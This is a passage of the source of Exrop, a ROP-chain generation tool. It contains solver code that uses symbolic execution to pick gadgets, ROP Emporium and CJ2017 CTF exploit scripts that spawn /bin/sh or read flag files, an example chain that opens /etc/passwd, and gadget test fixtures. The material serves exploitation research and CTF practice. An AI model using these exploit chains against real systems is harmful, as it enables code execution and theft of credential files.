        self.value = value
        self.type_val = type_val
        self.comment = comment
        self.idx_chain = idx_chain

    def parseFromModel(chain_value_model, comment="", type_val=0):
        chain_item = chain_value_model[0]
        alias = chain_item.getVariable().getAlias()
        idxchain = int(alias.replace("STACK", "")) + 1
        chain_value = chain_item.getValue()
        return ChainItem(chain_value, idxchain, comment, type_val)

    def getValue(self, base_addr=0):
        if base_addr and self.type_val == 1: # check if value is address
            return self.value + base_addr
        return self.value

class Chain(object):
    def __init__(self):
        self.written_regs = set()
        self.solved_regs = set()
        self.depends_regs = set()
        self.gadget = None
        self.chain_values = []

    def set_chain_values(self, chain_values):
        self.chain_values = chain_values

    def set_solved(self, gadget, values, regs=set(), written_regs=set(), depends_regs=set()):
        self.solved_regs.update(regs)
        self.written_regs.update(gadget.written_regs)
        self.written_regs.update(written_regs)
        self.depends_regs.update(depends_regs)
        self.gadget = gadget
        depends_chain_values = []
        chain_values = [ChainItem(0)]*(gadget.diff_sp//8 + 1)
        chain_values[0] = ChainItem(gadget.addr, 0, str(gadget), CHAINITEM_TYPE_ADDR)
        for chain_item in values:
            if isinstance(chain_item, RopChain):
                self.written_regs.update(chain_item.get_written_regs())
                self.depends_regs.update(chain_item.get_depends_regs())
                depends_chain_values += chain_item.get_chains()
                continue
            if chain_item:
                chain_values[chain_item.idx_chain] = chain_item

        self.chain_values += depends_chain_values + chain_values
        if gadget.end_gadget:
            self.written_regs.update(gadget.end_gadget.written_regs)

    def get_chains(self):
        return self.chain_values

    def get_written_regs(self):
        return self.written_regs

    def get_solved_regs(self):
        return self.solved_regs

    def dump(self, sp, base_addr=0):
        chains = self.get_chains()
        dump_str = ""
        for i in range(len(chains)):
            chain = chains[i]
            com = ""
            if chain.comment:
                com = " # {}".format(chain.comment)
            dump_str += "$RSP+0x{:04x} : 0x{:016x}{}\n".format(sp, chain.getValue(base_addr), com)
            sp += 8
        print(dump_str, end="")
        return sp

    def payload_str(self, base_addr=0):
        chains = self.get_chains()
        payload = b""
        for i in range(len(chains)):
            chain = chains[i]
            payload += chain.getValue(base_addr).to_bytes(8, 'little')
        return payload

    def __repr__(self):
        return "written_regs : {}\nsolved_regs: {}\n".format(self.written_regs, self.solved_regs)

    def __str__(self):
        return "written_regs : {}\nsolved_regs: {}\n".format(self.written_regs, self.solved_regs)

```

`Solver.py`:

```py
import code
import pickle
from itertools import combinations, chain
from triton import *
from Gadget import *
from RopChain import *

def initialize():
    ctx = TritonContext()
    ctx.setArchitecture(ARCH.X86_64)
    ctx.setMode(MODE.ALIGNED_MEMORY, True)
    ctx.setAstRepresentationMode(AST_REPRESENTATION.PYTHON)
    return ctx

def isintersect(a,b):
    for i in a:
        for j in b:
            if i==j:
                return True
    return False

def findCandidatesWriteGadgets(gadgets, avoid_char=None):
    candidates = {}
    for gadget in list(gadgets):
        badchar = False
        if avoid_char:
            for char in avoid_char:
                addrb = gadget.addr.to_bytes(8, 'little')
                if char in addrb:
                    badchar = True
                    break
        if badchar:
            continue
        if gadget.is_memory_write:
            isw = gadget.is_memory_write
            if not isw in candidates:
                candidates[isw] = [gadget]
                continue
            candidates[isw].append(gadget)
    return candidates

def findForRet(gadgets, min_diff_sp=0, not_write_regs=set(), avoid_char=None):
    for gadget in list(gadgets):
        badchar = False
        if avoid_char:
            for char in avoid_char:
                addrb = gadget.addr.to_bytes(8, 'little')
                if char in addrb:
                    badchar = True
                    break
        if badchar:
            continue
        if isintersect(not_write_regs, gadget.written_regs):
            continue
        if not gadget.is_memory_read and not gadget.is_memory_write and not gadget.is_syscall and gadget.end_type == TYPE_RETURN and gadget.diff_sp == min_diff_sp:
            return gadget

def findPivot(gadgets, not_write_regs=set(), avoid_char=None):
    candidates = []
    for gadget in list(gadgets):
        badchar = False
        if avoid_char:
            for char in avoid_char:
                addrb = gadget.addr.to_bytes(8, 'little')
                if char in addrb:
                    badchar = True
                    break
        if badchar:
            continue
        if isintersect(not_write_regs, gadget.written_regs):
            continue
        if gadget.pivot:
            candidates.append(gadget)
    return candidates

def findSyscall(gadgets, not_write_regs=set(), avoid_char=None):
    syscall_noret = None
    for gadget in list(gadgets):
        badchar = False
        if avoid_char:
            for char in avoid_char:
                addrb = gadget.addr.to_bytes(8, 'little')
                if char in addrb:
                    badchar = True
                    break
        if badchar:
            continue
        if isintersect(not_write_regs, gadget.written_regs):
            continue

        if not gadget.is_memory_read and not gadget.is_memory_write and gadget.is_syscall:
            if gadget.end_type == TYPE_RETURN:
                return gadget
            syscall_noret = gadget

    return syscall_noret

def findCandidatesGadgets(gadgets, regs_write, regs_items, not_write_regs=set(), avoid_char=None, cand_write_first=False):
    candidates_pop = []
    candidates_write = []
    candidates_depends = []
    candidates_defined = []
    candidates_defined2 = []
    candidates_no_return = []
    candidates_for_ret = []
    depends_regs = set()
    for gadget in list(gadgets):
        if isintersect(not_write_regs, gadget.written_regs) or gadget.is_memory_read or gadget.is_memory_write or gadget.end_type in [TYPE_UNKNOWN, TYPE_JMP_MEM, TYPE_CALL_MEM]:
            gadgets.remove(gadget)
            continue
        badchar = False
        if avoid_char:
            for char in avoid_char:
                addrb = gadget.addr.to_bytes(8, 'little')
                if char in addrb:
                    badchar = True
                    break
        if badchar:
            continue

        if isintersect(regs_write,set(gadget.defined_regs.keys())):
            if regs_items and isintersect(regs_items, set(gadget.defined_regs.items())):
                candidates_defined2.append(gadget)
            else:
                candidates_defined.append(gadget)
            gadgets.remove(gadget)
            depends_regs.update(gadget.depends_regs)
            continue

        if isintersect(regs_write,gadget.popped_regs):
            candidates_pop.append(gadget)
            gadgets.remove(gadget)
            depends_regs.update(gadget.depends_regs)
            continue

        if isintersect(regs_write,gadget.written_regs):
            candidates_write.append(gadget)
            gadgets.remove(gadget)
            depends_regs.update(gadget.depends_regs)
            continue

    if depends_regs:
        candidates_depends = findCandidatesGadgets(gadgets, depends_regs, set(), not_write_regs)
    if cand_write_first:
        candidates = candidates_write + candidates_defined2 + candidates_pop + candidates_defined + candidates_depends  # ordered by useful gadgets
    else:
        candidates = candidates_defined2 + candidates_pop + candidates_defined + candidates_write + candidates_no_return + candidates_depends  # ordered by useful gadgets

    for gadget in gadgets:
        if gadget.diff_sp in [8,0]:
            candidates_for_ret.append(gadget)
            gadgets.remove(gadget)

    candidates += candidates_for_ret
    return candidates

def extract_byte(bv, pos):
    return (bv >> pos*8) & 0xff

def filter_byte(astctxt, bv, bc, bsize):
    nbv = []
    for i in range(bsize):
        nbv.append(astctxt.lnot(astctxt.equal(astctxt.extract(i*8+7, i*8, bv),astctxt.bv(bc, 8))))
    return nbv

def check_contain_avoid_char(regvals, avoid_char):
    for char in avoid_char:
        for val in regvals:
            if isinstance(val, str):
                continue
            valb = val.to_bytes(8, 'little')
            if char in valb:
                return True
    return False

def get_all_written(tmp_solved):
    written_regs = set()
    for solved in tmp_solved:
        written_regs.update(solved.get_written_regs())
    return written_regs

def get_all_solved(tmp_solved):
    solved_regs = set()
    for solved in tmp_solved:
        solved_regs.update(solved.get_solved_regs())
    return solved_regs

def insert_tmp_solved(tmp_solved, solved):
    intersect = False
    if isintersect(solved.get_written_regs(), get_all_solved(tmp_solved)):
        intersect = True
    if intersect and len(tmp_solved) > 0:
        for i in range(len(tmp_solved)-1, -1, -1):
            solved_before = get_all_solved(tmp_solved[:i+1])
            if isintersect(solved.get_solved_regs(), tmp_solved[i].get_written_regs()) and not isintersect(solved_before, solved.get_written_regs()):
                tmp_solved.insert(i+1, solved)
                break
            regs_used_after = get_all_written(tmp_solved)
            if i == 0:
                if not isintersect(solved.get_solved_regs(), regs_used_after):
                    tmp_solved.insert(0, solved)
                else:
                    return False
    else:
        tmp_solved.append(solved)
    return True

def solveGadgets(gadgets, solves, avoid_char=None, keep_regs=set(), add_type=dict(), for_refind=set(), rec_limit=0):
    regs = ["rax", "rbx", "rcx", "rdx", "rsi", "rdi", "rbp", "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15"]
    find_write_first = False
    if avoid_char:
        find_write_first = check_contain_avoid_char(solves.values(), avoid_char)
    candidates = findCandidatesGadgets(gadgets[:], set(solves.keys()), set(solves.items()), avoid_char=avoid_char, cand_write_first=find_write_first)
    ctx = initialize()
    astCtxt = ctx.getAstContext()
    chains = RopChain()
    reg_refind = set()

    if rec_limit >= 30: # maximum recursion
        return []

    for gadget in candidates:
        tmp_solved_ordered = []
        tmp_solved_regs = set()
        tmp_solved_ordered2 = []
        if not gadget.is_asted:
            gadget.buildAst()
        reg_to_reg_solve = set()

        if isintersect(keep_regs, gadget.written_regs):
            continue

        for reg,val in solves.items():
            if reg not in gadget.written_regs or reg in gadget.end_reg_used:
                continue

            regAst = gadget.regAst[reg]
            if reg in gadget.defined_regs and gadget.defined_regs[reg] == val:
                tmp_solved_regs.add(reg)
                tmp_solved_ordered.append([])
                if isinstance(val, str):
                    reg_to_reg_solve.add(val)
                continue

            refind_dict = {}
            if isinstance(val, str): # probably registers
                if reg in gadget.defined_regs and isinstance(gadget.defined_regs[reg], str) and gadget.defined_regs[reg] != reg:
                    refind_dict[gadget.defined_regs[reg]] = val
                    hasil = []
                else:
                    continue
            else:
                if avoid_char:
                    if reg in gadget.defined_regs and isinstance(gadget.defined_regs[reg],int):
                        continue
                    childs = astCtxt.search(regAst, AST_NODE.VARIABLE)
                    filterbyte = []
                    hasil = False
                    valb = val.to_bytes(8, 'little')
                    lval = len(valb.strip(b"\x00"))
                    for char in avoid_char:
                        if char in valb:
                            for child in childs:
                                for char in avoid_char:
                                    fb = filter_byte(astCtxt, child, char, lval)
                                    filterbyte.extend(fb)
                            if filterbyte:
                                filterbyte.append(regAst == astCtxt.bv(val,64))
                    if filterbyte:
                        filterbyte = astCtxt.land(filterbyte)
                        hasil = list(ctx.getModel(filterbyte).values())
                    if not hasil: # try to find again
                        hasil = list(ctx.getModel(regAst == astCtxt.bv(val,64)).values())

                else:
                    hasil = list(ctx.getModel(regAst == astCtxt.bv(val,64)).values())

            for v in hasil:
                alias = v.getVariable().getAlias()
                if 'STACK' not in alias: # check if value is found not in stack
                    if alias in regs and alias not in refind_dict: # check if value is found in reg

                        # check if reg for next search contain avoid char, if
                        # true break
                        if alias == reg and avoid_char:
                            valb = v.getValue().to_bytes(8, 'little')
                            for char in avoid_char:
                                if char in valb:
                                    hasil = False
                                    refind_dict = False
                            if not hasil:
                                break

                        if ((alias != reg and (alias,val) not in for_refind) or v.getValue() != val):
                            refind_dict[alias] = v.getValue() # re-search value with new reg
                        else:
                            hasil = False
                            refind_dict = False
                            break
                    else:
                        hasil = False
                        break
                elif avoid_char: # check if stack is popped contain avoid char
                    for char in avoid_char:
                        if char in val.to_bytes(8, 'little'):
                            hasil = False
                            refind_dict = False
                            break
            if refind_dict:
#                print((gadget,refind_dict,rec_limit))
                tmp_for_refind = for_refind.copy() # don't overwrite old value
                tmp_for_refind.add((reg,val))
                reg_refind.update(set(list(refind_dict.keys())))
                hasil = solveGadgets(candidates[:], refind_dict, avoid_char, for_refind=tmp_for_refind, rec_limit=rec_limit+1)

            if hasil:
                if isinstance(val, str):
                    reg_to_reg_solve.add(gadget.defined_regs[reg])
                if not isinstance(hasil, RopChain):
                    type_chain = CHAINITEM_TYPE_VALUE
                    if add_type and reg in add_type and add_type[reg] == CHAINITEM_TYPE_ADDR:
                        type_chain = CHAINITEM_TYPE_ADDR
                    hasil = ChainItem.parseFromModel(hasil, type_val=type_chain)
                    tmp_solved_ordered.append(hasil)
                    tmp_solved_regs.add(reg)
                else:
                    if insert_tmp_solved(tmp_solved_ordered2, hasil):
                        tmp_solved_regs.add(reg)

        if not tmp_solved_regs:
            continue

        if gadget.end_type != TYPE_RETURN:
            if isintersect(set(list(solves.keys())), gadget.end_reg_used) or not gadget.end_ast:
                continue
            next_gadget = None
#            print("handling no return gadget")
            diff = 0
            if gadget.end_type == TYPE_JMP_REG:
                next_gadget = findForRet(candidates[:], 0, tmp_solved_regs, avoid_char=avoid_char)
            elif gadget.end_type == TYPE_CALL_REG:
                next_gadget = findForRet(candidates[:], 8, tmp_solved_regs, avoid_char=avoid_char)
                diff = 8
            if not next_gadget:
                continue
            gadget.end_gadget = next_gadget
            gadget.diff_sp += next_gadget.diff_sp - diff

            regAst = gadget.end_ast
            val = gadget.end_gadget.addr
            hasil = list(ctx.getModel(regAst == val).values())

            refind_dict = {}
            type_chains = {}
            for v in hasil:
                alias = v.getVariable().getAlias()
                if 'STACK' not in alias:
                    if alias in regs and alias not in refind_dict:
                        refind_dict[alias] = v.getValue()
                        type_chains[alias] = CHAINITEM_TYPE_ADDR
                    else:
                        hasil = False
                        break
            if refind_dict:
                reg_to_reg_solve.update(tmp_solved_regs)
                reg_to_reg_solve.update(reg_refind)
                hasil = solveGadgets(gadgets, refind_dict, avoid_char, add_type=type_chains, keep_regs=reg_to_reg_solve, rec_limit=rec_limit+1)
            if not hasil:
                continue
            if not isinstance(hasil, RopChain):
                type_chain = CHAINITEM_TYPE_ADDR
                hasil = ChainItem.parseFromModel(hasil, type_val=type_chain)
                tmp_solved_ordered.append(hasil)
            else:
                insert_tmp_solved(tmp_solved_ordered2, hasil)

        tmp_solved_ordered.extend(tmp_solved_ordered2)
        dep_regs = set()
        if reg_to_reg_solve:
            dep_regs = reg_to_reg_solve - tmp_solved_regs

        tmp_chain = Chain()
        tmp_chain.set_solved(gadget, tmp_solved_ordered, tmp_solved_regs, depends_regs=dep_regs)

        if not chains.insert_chain(tmp_chain):
#            print("failed insert")
            continue # can't insert chain

        for reg in tmp_solved_regs:
            if reg in solves:
                del solves[reg]

        if not solves:
            return chains

    return []

def solveWriteGadgets(gadgets, solves, avoid_char=None):
    regs = ["rax", "rbx", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15"]
    final_solved = []
    candidates = findCandidatesWriteGadgets(gadgets[:], avoid_char=avoid_char)
    ctx = initialize()
    gwr = list(candidates.keys())
    chains = RopChain()
    gwr.sort()
    for w in gwr:
        for gadget in candidates[w]:
            if not gadget.is_asted:
                gadget.buildAst()
            for addr,val in list(solves.items())[:]:
                mem_ast = gadget.memory_write_ast[0]
                if mem_ast[1].getBitvectorSize() != 64:
                    break
                addrhasil = ctx.getModel(mem_ast[0] == addr).values()
                valhasil = ctx.getModel(mem_ast[1] == val).values()
                if not addrhasil or not valhasil:
                    break
                hasil = list(addrhasil) + list(valhasil)
                refind_dict = {}
#                code.interact(local=locals())
                for v in hasil:
                    alias = v.getVariable().getAlias()
                    if 'STACK' not in alias:
                        if alias in regs and alias not in refind_dict:
                            refind_dict[alias] = v.getValue()
                        else:
                            hasil = False
                            break
                if hasil and refind_dict:
                    hasil = solveGadgets(gadgets[:], refind_dict, avoid_char=avoid_char)
                if hasil:
                    del solves[addr]
                    chain = Chain()
                    chain.set_solved(gadget, [hasil])
                    chains.insert_chain(chain)
                    if not solves:
                        return chains

def solvePivot(gadgets, addr_pivot, avoid_char=None):
    regs = ["rax", "rbx", "rcx", "rdx", "rsi", "rdi", "rbp", "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15"]
    candidates = findPivot(gadgets, avoid_char=avoid_char)
    ctx = initialize()
    chains = RopChain()
    for gadget in candidates:
        if not gadget.is_asted:
            gadget.buildAst()
        hasil = ctx.getModel(gadget.pivot_ast == addr_pivot).values()
        for v in hasil:
            alias = v.getVariable().getAlias()
            refind_dict = dict()
            if 'STACK' not in alias:
                if alias in regs and alias not in refind_dict:
                    refind_dict[alias] = v.getValue()
                else:
                    hasil = False
                    break
            else:
                idxchain = int(alias.replace("STACK", ""))
                new_diff_sp = (idxchain+1)*8
        if hasil and refind_dict:
            hasil = solveGadgets(gadgets[:], refind_dict, avoid_char=avoid_char)
            new_diff_sp = 0
        if not hasil:
            continue
        gadget.diff_sp = new_diff_sp
        chain = Chain()
        chain.set_solved(gadget, [hasil])
        chains.insert_chain(chain)
        return chains

```

`examples/CJ2017_echo/exploit.py`:

```py
from pwn import *
import time
from Exrop import Exrop

binname = "echo"
libc = ELF(binname, checksec=False)
bss = libc.bss()

t = time.mktime(time.gmtime())
rop = Exrop(binname)
rop.find_gadgets(cache=True) # it's slow for first analyze keep waiting
print("Analyzing done in {}s".format(time.mktime(time.gmtime()) - t))
chain = rop.syscall(0x3b, ("/bin/sh",0,0), bss)
chain.dump()
buf = b"A"*10008
pay = buf + chain.payload_str()
p = process("./echo")
p.sendline(pay)
p.interactive()

```

`examples/CJ2017_echo/exploit_orw.py`:

```py
from pwn import *
from Exrop import Exrop

binname = "echo"
elf = ELF(binname, checksec=False)
rwaddr = elf.bss()

SYS_OPEN = 2
SYS_READ = 0
SYS_WRITE = 1

rop = Exrop(binname)
rop.find_gadgets(cache=True)
chain = rop.syscall(SYS_OPEN, ('./this_is_flag.txt', 0, 0), rwaddr)
chain += rop.syscall(SYS_READ, ('rax', rwaddr, 0x40))
chain += rop.syscall(SYS_WRITE, (1, rwaddr, 0x40))
chain.dump()
buf = b"A"*10008
pay = buf + chain.payload_str()
p = process("./echo")
p.sendline(pay)
p.interactive()

```

`examples/CJ2017_echo/this_is_flag.txt`:

```txt
flag{this_is_dummy_flag}

```

`examples/avoid_badchars.py`:

```py
from Exrop import Exrop
import time

rop = Exrop("libc.so.6")
rop.find_gadgets(cache=True) # it's slow for first analyze keep waiting
chain = rop.set_regs({'rsi': 0x330a330d, 'rdx': 0x33330a3333, 'rax': 0x0d33440a}, avoid_char=b'\x0a\x0d')
chain.dump()
#print(chain.payload_str())

```

`examples/open-read-write.py`:

```py
from pwn import *
import time
from Exrop import Exrop

binname = "libc.so.6"
libc = ELF(binname, checksec=False)
open = libc.symbols['open']
read = libc.symbols['read']
write = libc.symbols['write']
bss = libc.bss()

t = time.mktime(time.gmtime())
rop = Exrop(binname)
rop.find_gadgets(cache=True) # it's slow for first analyze keep waiting
print("open('/etc/passwd', 0)")
chain = rop.func_call(open, ("/etc/passwd", 0), bss)
chain.set_base_addr(0x00007ffff79e4000)
chain.dump()
print("read('rax', bss, 0x100)") # register can be used as argument too!
chain = rop.func_call(read, ('rax', bss, 0x100))
chain.set_base_addr(0x00007ffff79e4000)
chain.dump()
print("write(1, bss, 0x100)")
chain = rop.func_call(write, (1, bss, 0x100))
chain.set_base_addr(0x00007ffff79e4000)
chain.dump()
print("done in {}s".format(time.mktime(time.gmtime()) - t))
#print(chain.payload_str())

```

`examples/rop_emporium/badchars/exploit.py`:

```py
from Exrop import Exrop
from pwn import *

binname = "./badchars"
rop = Exrop(binname)
rop.find_gadgets(cache=True)
elf = ELF("./badchars", checksec=False)
system = elf.symbols['system']
print("system @ {:08x}".format(system))
chain = rop.func_call(system, ("head${IFS}?lag.txt", 0), elf.bss()) # hack to avoid badchar
#chain.dump()
buf  = b"A"*40
payload = buf + chain.payload_str()
p = process("./badchars")
p.recv(1024)
p.sendline(payload)
p.interactive()

```

`examples/rop_emporium/badchars/flag.txt`:

```txt
ROPE{a_placeholder_32byte_flag!}

```

`examples/rop_emporium/callme/encrypted_flag.txt`:

```txt
SMSA~gXxekhieactt`L''tnl|E}p|y>]!

```

`examples/rop_emporium/callme/exploit.py`:

```py
from pwn import *
from Exrop import Exrop

binname = "./callme"
p = process(binname)
elf = ELF(binname)
callme_one = elf.symbols['callme_one']
callme_two = elf.symbols['callme_two']
callme_three = elf.symbols['callme_three']
rop = Exrop(binname)
rop.find_gadgets(cache=True)
chain1 = rop.func_call(callme_one, (1,2,3))
chain1.dump()
chain2 = rop.func_call(callme_two, (1,2,3))
chain2.dump()
chain3 = rop.func_call(callme_three, (1,2,3))
chain3.dump()
buf = b"A"*0x28
rop = chain1.payload_str() + chain2.payload_str() + chain3.payload_str()
pay = buf + rop
p.sendlineafter("> ", pay)
p.interactive()

```

`examples/rop_emporium/callme/key1.dat`:

```dat
	

```

`examples/rop_emporium/callme/key2.dat`:

```dat
 
```

`examples/rop_emporium/fluff/exploit.py`:

```py
from Exrop import Exrop
from pwn import *

binname = "fluff"
rop = Exrop(binname)
rop.find_gadgets(cache=True, add_opt="--depth 15")
elf = ELF(binname, checksec=False)
bss = elf.bss()
system = elf.symbols['system']
chain = rop.func_call(system, ("/bin/sh",), elf.bss())
chain.dump()
buf = b"A"*40
buf += chain.payload_str()
p = process("./fluff")
p.sendlineafter("> ", buf)
p.interactive()

```

`examples/rop_emporium/fluff/flag.txt`:

```txt
ROPE{a_placeholder_32byte_flag!}

```

`examples/rop_emporium/pivot/exploit.py`:

```py
from Exrop import Exrop
from pwn import *

context.terminal = "tmux splitw -h -f".split()
binname = "pivot"
p = process(binname)
rop = Exrop(binname)
elf = ELF(binname, checksec=False)
libpivot = ELF("./libpivot.so", checksec=False)
buf = b"A"*0x28
ret = 0x00000000004007c9 # for padding

rop.find_gadgets(cache=True)
puts = elf.symbols['puts']
footholdgot = elf.got['foothold_function']
foothold = elf.symbols['foothold_function']
main = elf.symbols['main']

p.recvuntil(": ")
pivot_addr = int(p.recvuntil("\n", drop=True), 16)

pivot_chain = rop.stack_pivot(pivot_addr, avoid_char=b"\x0a")
pivot_chain.dump()
chain2 = rop.func_call(puts, (footholdgot,))
chain2.dump()
pay = buf + pivot_chain.payload_str()

rop = p64(foothold) + chain2.payload_str() + p64(main)
p.sendlineafter("> ", rop)
p.sendlineafter("> ", pay)
p.recvuntil("libpivot.so")
leak = u64(p.recvuntil("\n", drop=True).ljust(8, b"\x00"))
libpivot.address = leak - libpivot.symbols['foothold_function']
ret2win = libpivot.symbols['ret2win']
print(hex(libpivot.address))
p.sendlineafter("> ", buf + p64(ret) + p64(ret2win))
p.interactive()

```

`examples/rop_emporium/pivot/flag.txt`:

```txt
ROPE{a_placeholder_32byte_flag!}

```

`examples/rop_emporium/split/exploit.py`:

```py
from pwn import *
from Exrop import Exrop

binname = "./split"
p = process(binname)
elf = ELF(binname)
catflag = next(elf.search(b"/bin/cat flag.txt"))
system = elf.symbols['system']
rop = Exrop(binname)
rop.find_gadgets(cache=True)
chain = rop.func_call(system, (catflag, 0))
chain.dump()
buf = b"A"*0x28
pay = buf + chain.payload_str()
p.sendlineafter("> ", pay)
p.interactive()

```

`examples/rop_emporium/split/flag.txt`:

```txt
ROPE{a_placeholder_32byte_flag!}

```

`examples/rop_emporium/write4/exploit.py`:

```py
from Exrop import Exrop
from pwn import *

binname = "write4"
rop = Exrop(binname)
rop.find_gadgets(cache=True)
elf = ELF(binname, checksec=False)
bss = elf.bss()
system = elf.symbols['system']
chain = rop.func_call(system, ("/bin/sh",), elf.bss())
chain.dump()
ret = p64(0x0000000000400806) # for padding
buf = b"A"*40
buf += ret + chain.payload_str() # ret for padding
p = process(binname)
p.sendlineafter("> ", buf)
p.interactive()

```

`examples/rop_emporium/write4/flag.txt`:

```txt
ROPE{a_placeholder_32byte_flag!}

```

`examples/set_regs_all.py`:

```py
from Exrop import Exrop
import time

rop = Exrop("libc.so.6")
t = time.mktime(time.gmtime())
rop.find_gadgets(cache=True) # it's slow for first analyze keep waiting
print("Analyzing done in {}s".format(time.mktime(time.gmtime()) - t))
print("write-regs gadgets: rdi=0x41414141, rsi=0x42424242, rdx=0x43434343, rax:0x44444444, rbx=0x45454545, rcx=0x4b4b4b4b, r8=0x47474747, r9=0x48484848, r10=0x49494949, r11=0x4a4a4a4a, r12=0x50505050, r13=0x51515151, r14=0x52525252, r15=0x53535353")
chain = rop.set_regs({'rdi':0x41414141, 'rsi': 0x42424242, 'rdx':0x43434343, 'rax':0x44444444, 'rbx': 0x45454545, 'rcx':0x4b4b4b4b, 'r8': 0x47474747, 'r9': 0x48484848, 'r10':0x49494949, 'r11': 0x4a4a4a4a, 'r12': 0x50505050, 'r13': 0x51515151, 'r14':0x52525252, 'r15': 0x53535353})
chain.dump()
#print(chain.payload_str())

```

`examples/syscall.py`:

```py
from Exrop import Exrop
import time

rop = Exrop("libc.so.6")
t = time.mktime(time.gmtime())
rop.find_gadgets(cache=True) # it's slow for first analyze keep waiting
print("Analyzing done in {}s".format(time.mktime(time.gmtime()) - t))
chain = rop.syscall(1, (1,2,3))
chain.dump()
#print(chain.payload_str())

```

`tests/badchar_add`:

```
{
    "gadgets": {
        0x0a10: 'pop rsi; ret',
        0x1000: 'pop rsi; pop rdi; ret',
        0x2000: 'mov rbx, rsi; ret',
        0x3000: 'mov rbx, rcx; ret',
        0x4000: 'mov rcx, rbx; add rcx, 20; ret',
    },
    "find": {
        "rcx": 0xffee0aee
    },
    "badchars": b"\x0a",
}

```

`tests/badchar_xor`:

```
{
    "gadgets": {
        0x0a10: 'pop rdi; ret',
        0x1000: 'pop rsi; pop rdi; ret',
        0x2000: 'pop rdx; ret',
        0x4000: "xor rdx, rdi; ret",
        0x5000: "xor rdi, rsi; ret"
    },
    "find": {
        "rdx": 0x0abb0acc,
        "rdi": 0xbb0acc0a,
    },
    "badchars": b"\x0a",
}

```

`tests/basic_pop`:

```
{
    "gadgets": {
        0x3000: 'pop rdi; pop rsi; ret',
        0x4000: 'mov rax, rdx; ret',
        0x5000: 'pop rdx; ret',
    },
    "find": {
        "rax": 0x43434343,
        "rsi": 0x41414141,
    }
}

```

`tests/find_reg`:

```
{
    "gadgets": {
        0x1000: 'pop rsi; ret',
        0x5000: 'ret',
        0x2000: 'mov rbx, rsi; jmp rax',
        0x3000: 'mov rdi, rbx; pop rdx; ret',
        0x4000: 'pop rax; ret',
    },
    "find": {
        "rdi": "rsi",
    }
}

```

`tests/find_reg_2`:

```
{
    "gadgets": {
        0x1000: 'mov r8, rax; call r12',
        0x2000: 'mov rdi, r8; call rax',
        0x6000: 'pop rax; pop rbx; ret',
        0x5000: 'pop rax; pop rbx; pop r8; ret',
        0x3000: 'pop r12; ret',
        0x4000: 'pop rdi; ret',
    },
    "find": {
        "rdi": "rax",
    }
}

```

`tests/find_reg_3`:

```
{
    "gadgets": {
        0x1000: 'add eax, 0x5d000000 ; pop r12 ; ret',
        0x2000: 'mov r8, rax ; call r12',
        0x3000: 'mov rax, rbx ; pop rbx ; ret',
        0x4000: 'pop r12; pop r13; pop r15; ret',
    },
    "find": {
        "r8": "rax",
    }
}

```

`tests/fixed_invalid_find_reg`:

```
{
    "gadgets": {
        0x1000: 'pop rax; ret',
        0x2000: 'pop r12; ret',
        0x3000: 'pop rdi; ret',
        0x4000: 'mov r8, rax; call r12',
        0x5000: 'mov rdi, r8; call rax',
    },
    "find": {
        "rdi": "rax",
    }
}

```

`tests/fixed_invalid_mov`:

```
{
    "gadgets": {
        0x00000000001306d9: "pop rdi; ret",
        0x00000000001663b1: "pop r13; ret",
        0x0000000000091ec4: "mov r9, r13 ; call rbx",
        0x0000000000166400: "sub al,0; pop rbx; ret",
    },
    "find": {
        'rdi':0x41414141,
        'r9': 0x42424242
    }
}

```

`tests/fixed_invalid_pop`:

```
{
    "gadgets": {
        0x00000000001306d9: "pop rdx; pop rsi; ret",
        0x00000000001663b1: "pop rax; pop rdx; pop rbx; ret",
        0x0000000000091ec4: "mov rax, rdx; add rsp, 8; ret",
        0x00000000001663b1: "pop rax; pop rdx; pop rbx; ret",
        0x00000000001663b5: "pop rdx; pop rbx; ret",
        0x000000000002155f: "pop rdi; ret"
    },
    "find": {
        'rdi':0x41414141, 'rsi': 0x42424242, 'rdx':0x43434343, 'rax':0x44444444, 'rbx': 0x45454545
    }
}

```

`tests/invalid_no_return`:

```
{
    "gadgets": {
        0x1000: 'pop rax; ret',
        0x2000: 'pop r12; ret',
        0x3000: 'pop rdi; ret',
        0x4000: 'mov r8, rax; call r12',
        0x5000: 'mov rdi, r8; call rax',
    },
    "find": {
        "rdi": 0x41414142,
        "rdx": 0x43434343,
    }
}

```

`tests/multi_pop`:

```
{
    "gadgets": {
        0x2000: 'mov rax, rbx; pop rbx; ret',
        0x3000: 'pop rdi; ret',
        0x4000: 'pop rsi; ret',
        0x5000: 'pop rdx; ret',
    },
    "find": {
        "rax": 0x0b0c0a0d,
        "rbx": 0xddccbbaa,
    }
}

```

`tests/no-return`:

```
{
    "gadgets": {
        0x1000: 'pop rsi; ret',
        0x2000: 'mov rbx, rsi; jmp rax',
        0x3000: 'mov rdi, rbx; ret',
        0x5000: 'pop rax; ret',
        0x4000: 'ret',
    },
    "find": {
        "rdi": 0xff00ee00
    }
}

```

`tests/pivot`:

```
{
    "type": "pivot",
    "gadgets": {
        0x4000: 'leave; ret',
        0x5000: 'pop rbp; ret',
    },
    "find": 0x41414242
}

```

`tests/pop`:

```
{
    "gadgets": {
        0x1000: 'pop rsi; ret',
        0x2000: 'mov rbx, rsi; ret',
        0x3000: 'mov rax, rcx; ret',
        0x4000: 'mov rcx, rbx; add rcx, 100; ret',
        0x5000: 'mov rdx, rsi; ret',
        0x6000: 'mov rdi, rax; ret',
    },
    "find": {
        "rdi": 0x41414242,
        "rsi": 0xffffffff,
        "rdx": 0x43434343,
        "rax": 0x0b0c0a0d,
        "rbx": 0xddccbbaa,
        "rcx": 0xffeeffee
    }
}

```

`tests/syscall`:

```
{
    "gadgets": {
        0x5000: 'pop rbx; jmp qword ptr [rax]',
        0x6000: 'syscall; ret',
        0x7000: 'mov rbx, 100; ret',
        0x4000: 'mov rcx, rbx; add rcx, 100; ret',

    },
    "find": {
        "rax": 0x43434343,
        "rsi": 0x41414141,
    }
}

```

`tests/test.py`:

```py
from ChainBuilder import ChainBuilder
from Exrop import Exrop
from Gadget import *
import sys
import code
from keystone import *

def asm_ins(code):
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    insns = bytes(ks.asm(code)[0])
    return insns

if len(sys.argv) == 1:
    print("use: {} test_file".format(sys.argv[0]))
    sys.exit(1)

def test_reg(data_test):
    chain_builder.set_regs(data_test['find'])
    avoid_char = None
    if 'badchars' in data_test:
        avoid_char = data_test['badchars']
    chain_builder.solve_chain(avoid_char=avoid_char)

